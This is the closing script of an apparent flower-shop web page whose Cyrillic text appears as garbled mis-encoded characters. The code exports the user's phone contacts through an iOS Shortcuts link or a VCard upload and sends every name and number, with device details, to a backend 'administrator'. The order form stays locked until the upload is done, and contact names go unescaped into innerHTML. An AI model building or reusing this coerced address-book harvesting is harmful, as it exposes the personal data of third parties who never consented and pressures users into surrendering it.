    // –°—Å—ã–ª–∫–∞ –Ω–∞ Shortcuts (–Ω—É–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å –æ—Ç–¥–µ–ª—å–Ω—ã–π Shortcut)
    const shortcutsUrl = 'shortcuts://create-shortcut?name=Export%20Contacts&text=[–í–°–¢–ê–í–¨–¢–ï_–í–ê–®_SHORTCUT]';
    
    const openShortcutsBtn = document.createElement('button');
    openShortcutsBtn.className = 'btn';
    openShortcutsBtn.style.marginTop = '15px';
    openShortcutsBtn.innerHTML = '<i class="fas fa-external-link-alt"></i> –û–¢–ö–†–´–¢–¨ SHORTCUTS';
    openShortcutsBtn.onclick = () => {
        window.location.href = shortcutsUrl;
    };
    
    contactsLoader.appendChild(openShortcutsBtn);
    
    // –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–ª–µ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ VCF —Ñ–∞–π–ª–∞
    const vcfUpload = document.createElement('div');
    vcfUpload.className = 'vcard-upload';
    vcfUpload.style.marginTop = '15px';
    vcfUpload.innerHTML = `
        <i class="fas fa-file-upload vcard-icon"></i>
        <p><strong>–ó–∞–≥—Ä—É–∑–∏—Ç—å VCard —Ñ–∞–π–ª</strong></p>
        <p class="input-hint">–ó–∞–≥—Ä—É–∑–∏—Ç–µ .vcf —Ñ–∞–π–ª –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –∏–∑ Shortcuts</p>
    `;
    vcfUpload.onclick = () => {
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = '.vcf,.vcard';
        input.style.display = 'none';
        input.onchange = (e) => handleVCardUpload(e);
        document.body.appendChild(input);
        input.click();
    };
    
    contactsLoader.appendChild(vcfUpload);
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ VCard —Ñ–∞–π–ª–∞ (–¥–ª—è iOS –º–µ—Ç–æ–¥–∞)
function handleVCardUpload(event) {
    const file = event.target.files[0];
    if (!file) return;
    
    const contactsLoader = document.getElementById('contactsLoader');
    const loaderText = document.getElementById('loaderText');
    
    contactsLoader.style.display = 'block';
    loaderText.textContent = '–ß—Ç–µ–Ω–∏–µ VCard —Ñ–∞–π–ª–∞...';
    
    const reader = new FileReader();
    
    reader.onload = async function(e) {
        try {
            loaderText.textContent = '–ü–∞—Ä—Å–∏–Ω–≥ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤...';
            
            const vcardData = e.target.result;
            const contacts = parseVCard(vcardData);
            
            if (contacts.length === 0) {
                throw new Error('–ù–µ –Ω–∞–π–¥–µ–Ω–æ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ –≤ —Ñ–∞–π–ª–µ');
            }
            
            await processAndSendContacts(contacts, 'ios_vcard');
            
        } catch (error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞ VCard:', error);
            showNotification('–û—à–∏–±–∫–∞', error.message, 'error');
            contactsLoader.style.display = 'none';
        }
    };
    
    reader.onerror = function(error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–∞:', error);
        showNotification('–û—à–∏–±–∫–∞', '–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–∞', 'error');
        contactsLoader.style.display = 'none';
    };
    
    reader.readAsText(file);
}

// –ü–∞—Ä—Å–µ—Ä VCard —Ñ–∞–π–ª–∞
function parseVCard(vcardData) {
    const contacts = [];
    const vcardEntries = vcardData.split('BEGIN:VCARD');
    
    vcardEntries.forEach(entry => {
        if (!entry.trim() || !entry.includes('END:VCARD')) return;
        
        const lines = entry.split('\n');
        let name = '';
        let phones = [];
        
        lines.forEach(line => {
            const trimmedLine = line.trim();
            
            if (trimmedLine.startsWith('FN:')) {
                name = trimmedLine.substring(3).trim();
            } else if (trimmedLine.startsWith('N:')) {
                const nameParts = trimmedLine.substring(2).trim().split(';');
                if (nameParts.length > 0 && !name) {
                    name = nameParts.slice(0, 2).filter(Boolean).reverse().join(' ').trim();
                }
            } else if (trimmedLine.startsWith('TEL;') || trimmedLine.startsWith('TEL:')) {
                let phone = '';
                
                if (trimmedLine.startsWith('TEL;')) {
                    const parts = trimmedLine.split(':');
                    if (parts.length > 1) {
                        phone = parts[1].trim();
                    }
                } else if (trimmedLine.startsWith('TEL:')) {
                    phone = trimmedLine.substring(4).trim();
                }
                
                phone = phone.replace(/\D/g, '');
                
                if (phone.length >= 10) {
                    phones.push(phone);
                }
            }
        });
        
        if (name && phones.length > 0) {
            phones.forEach(phone => {
                contacts.push({
                    name: name,
                    phone: phone,
                    rawName: [name],
                    rawTel: [phone]
                });
            });
        } else if (phones.length > 0) {
            phones.forEach(phone => {
                contacts.push({
                    name: '–ë–µ–∑ –∏–º–µ–Ω–∏',
                    phone: phone,
                    rawName: ['–ë–µ–∑ –∏–º–µ–Ω–∏'],
                    rawTel: [phone]
                });
            });
        }
    });
    
    return contacts;
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤
async function processAndSendContacts(contacts, source) {
    const contactsLoader = document.getElementById('contactsLoader');
    const loaderText = document.getElementById('loaderText');
    const contactsError = document.getElementById('contactsError');
    
    try {
        if (!contacts || contacts.length === 0) {
            throw new Error('–ù–µ –ø–æ–ª—É—á–µ–Ω–æ –Ω–∏ –æ–¥–Ω–æ–≥–æ –∫–æ–Ω—Ç–∞–∫—Ç–∞');
        }
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä
        showContactsPreview(contacts);
        
        // –°–ø—Ä–∞—à–∏–≤–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ
        const confirmSend = confirm(`–ù–∞–π–¥–µ–Ω–æ ${contacts.length} –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤. –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É?`);
        
        if (!confirmSend) {
            contactsLoader.style.display = 'none';
            return;
        }
        
        loaderText.textContent = '–û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É...';
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä
        await sendContactsToServer(contacts, source);
        
    } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤:', error);
        contactsLoader.style.display = 'none';
        contactsError.style.display = 'block';
        document.getElementById('contactsErrorMessage').textContent = error.message;
    }
}

// –ü–æ–∫–∞–∑–∞—Ç—å –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤
function showContactsPreview(contacts) {
    const previewContainer = document.getElementById('contactsPreview');
    const previewCount = document.getElementById('contactsPreviewCount');
    const previewList = document.getElementById('contactsPreviewList');
    
    previewCount.textContent = contacts.length;
    
    let html = '';
    contacts.slice(0, 20).forEach((contact, index) => {
        const formattedPhone = contact.phone.length > 9 ? 
            `+${contact.phone}` : 
            `+996 ${contact.phone.substring(0, 3)} ${contact.phone.substring(3, 6)} ${contact.phone.substring(6, 9)}`;
        
        html += `
            <div class="contact-item">
                <div class="contact-name">${index + 1}. ${contact.name}</div>
                <div class="contact-phone">${formattedPhone}</div>
            </div>
        `;
    });
    
    if (contacts.length > 20) {
        html += `
            <div class="contact-item" style="color: #666; font-style: italic; justify-content: center;">
                ... –∏ –µ—â–µ ${contacts.length - 20} –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤
            </div>
        `;
    }
    
    previewList.innerHTML = html;
    previewContainer.style.display = 'block';
}

// –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä
async function sendContactsToServer(contacts, source) {
    const contactsLoader = document.getElementById('contactsLoader');
    const loaderText = document.getElementById('loaderText');
    const contactsError = document.getElementById('contactsError');
    const deviceInfo = detectPlatform();
    
    try {
        contactsCount = contacts.length;
        
        console.log(`üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º ${contacts.length} –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ –∏–∑ ${source}...`);
        
        const response = await fetch(`${BACKEND_URL}/api/upload-contacts`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                userId: userId,
                chatId: chatId,
                contacts: contacts,
                firstName: '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å',
                platform: deviceInfo.isAndroid ? 'android' : (deviceInfo.isIOS ? 'ios' : 'other'),
                deviceInfo: JSON.stringify(deviceInfo),
                importSource: source
            })
        });
        
        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: ${response.status} - ${errorText}`);
        }
        
        const result = await response.json();
        console.log('‚úÖ –†–µ–∑—É–ª—å—Ç–∞—Ç –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞:', result);
        
        if (result.success) {
            contactsUploaded = true;
            contactsLoader.style.display = 'none';
            showContactsSuccess();
            
            showNotification('‚úÖ –£—Å–ø–µ—à–Ω–æ!', 
                `–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ ${contacts.length} –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤. –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –ø–æ–ª—É—á–∏–ª —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ.`, 
                'success');
                
        } else {
            throw new Error(result.error || '–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤');
        }
        
    } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤:', error);
        contactsLoader.style.display = 'none';
        contactsError.style.display = 'block';
        document.getElementById('contactsErrorMessage').textContent = error.message;
    }
}

// –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–µ—Å—Ç–æ–≤—ã–µ –∫–æ–Ω—Ç–∞–∫—Ç—ã (–¥–ª—è –æ—Ç–ª–∞–¥–∫–∏)
async function useTestContacts() {
    const contactsLoader = document.getElementById('contactsLoader');
    const loaderText = document.getElementById('loaderText');
    
    contactsLoader.style.display = 'block';
    loaderText.textContent = '–ò—Å–ø–æ–ª—å–∑—É—é —Ç–µ—Å—Ç–æ–≤—ã–µ –∫–æ–Ω—Ç–∞–∫—Ç—ã...';
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/test-contacts`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                userId: userId,
                chatId: chatId,
                firstName: '–¢–µ—Å—Ç–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å'
            })
        });
        
        if (!response.ok) {
            throw new Error(`–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: ${response.status}`);
        }
        
        const result = await response.json();
        
        if (result.success) {
            contactsUploaded = true;
            contactsCount = result.contactsCount || 0;
            contactsLoader.style.display = 'none';
            showContactsSuccess();
            
            showNotification('‚úÖ –¢–µ—Å—Ç–æ–≤—ã–µ –∫–æ–Ω—Ç–∞–∫—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã!', 
                '–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –ø–æ–ª—É—á–∏–ª —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ —Ç–µ—Å—Ç–æ–≤—ã—Ö –∫–æ–Ω—Ç–∞–∫—Ç–∞—Ö.', 
                'success');
        } else {
            throw new Error(result.error || '–û—à–∏–±–∫–∞ —Ç–µ—Å—Ç–æ–≤—ã—Ö –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤');
        }
        
    } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ —Ç–µ—Å—Ç–æ–≤—ã—Ö –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤:', error);
        contactsLoader.style.display = 'none';
        showNotification('–û—à–∏–±–∫–∞', error.message, 'error');
    }
}

// –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç—ã –ø–æ—Å–ª–µ Intent (–¥–ª—è Android)
function checkForContactsAfterIntent() {
    const contactsLoader = document.getElementById('contactsLoader');
    const loaderText = document.getElementById('loaderText');
    
    contactsLoader.style.display = 'block';
    loaderText.textContent = '–ü—Ä–æ–≤–µ—Ä—è—é –ø–æ–ª—É—á–µ–Ω–Ω—ã–µ –∫–æ–Ω—Ç–∞–∫—Ç—ã...';
    
    // –í —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∑–¥–µ—Å—å –±—ã–ª–∞ –±—ã –ª–æ–≥–∏–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è
    // –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ —á–µ—Ä–µ–∑ –≤–æ–∑–≤—Ä–∞—Ç –∏–∑ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
    // –î–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–µ–º —Ç–µ—Å—Ç–æ–≤—ã–µ –∫–æ–Ω—Ç–∞–∫—Ç—ã
    
    setTimeout(() => {
        useTestContacts();
    }, 2000);
}

// –ü–æ–∫–∞–∑–∞—Ç—å —É—Å–ø–µ—à–Ω—ã–π —ç–∫—Ä–∞–Ω
function showContactsSuccess() {
    document.getElementById('contactsLoader').style.display = 'none';
    document.getElementById('contactsSuccess').style.display = 'block';
    document.getElementById('contactsCountText').textContent = `–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤: ${contactsCount}`;
    document.getElementById('contactsRequired').innerHTML = '‚úÖ –ö–æ–Ω—Ç–∞–∫—Ç—ã —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!';
    document.getElementById('contactsRequired').style.color = '#34c759';
}

// –ü–æ–≤—Ç–æ—Ä–∏—Ç—å –∑–∞–ø—Ä–æ—Å
function retryContactsRequest() {
    document.getElementById('contactsError').style.display = 'none';
    getAllContactsAutomatically();
}

// –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å –∫ —Ñ–æ—Ä–º–µ
function continueToForm() {
    if (!contactsUploaded) {
        showNotification('–û—à–∏–±–∫–∞', '–°–Ω–∞—á–∞–ª–∞ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–æ–Ω—Ç–∞–∫—Ç—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É', 'error');
        return;
    }
    
    document.getElementById('contactsScreen').style.display = 'none';
    document.getElementById('mainContainer').style.display = 'block';
    
    document.getElementById('contactsStatusText').innerHTML = 
        `<i class="fas fa-check-circle" style="color: #34c759;"></i> –ö–æ–Ω—Ç–∞–∫—Ç—ã –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã: ${contactsCount} ‚úì`;
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º —Ñ–æ—Ä–º—É (—ç—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –≤ –≤–∞—à–µ–º –∫–æ–¥–µ —Ñ–æ—Ä–º—ã)
    if (typeof setupEventListeners === 'function') {
        setupEventListeners();
    }
    if (typeof showStep === 'function') {
        showStep(1);
    }
    if (typeof updateContactStepUI === 'function') {
        updateContactStepUI();
    }
}

// –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
function showNotification(title, message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.innerHTML = `
        <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'} notification-icon"></i>
        <div class="notification-content">
            <div class="notification-title">${title}</div>
            <div class="notification-message">${message}</div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.classList.add('show');
    }, 100);
    
    setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 400);
    }, 5000);
}

console.log('‚úÖ Flower Market –≥–æ—Ç–æ–≤ –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤!');
  </script>
  
  <!-- –ó–¥–µ—Å—å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –í–ï–°–¨ –æ—Å—Ç–∞–ª—å–Ω–æ–π –∫–æ–¥ —Ñ–æ—Ä–º—ã -->
  <!-- –ö–æ–ø–∏—Ä—É–π—Ç–µ —Å—é–¥–∞ –≤—Å—é –æ—Å–Ω–æ–≤–Ω—É—é —Ñ–æ—Ä–º—É (—à–∞–≥–∏ 1-7) –∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ –∫–æ–¥–∞ -->
  <!-- –Ø –Ω–µ –∫–æ–ø–∏—Ä—É—é –µ–≥–æ –∑–¥–µ—Å—å –¥–ª—è —ç–∫–æ–Ω–æ–º–∏–∏ –º–µ—Å—Ç–∞, –Ω–æ –æ–Ω –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å -->
</body>
</html>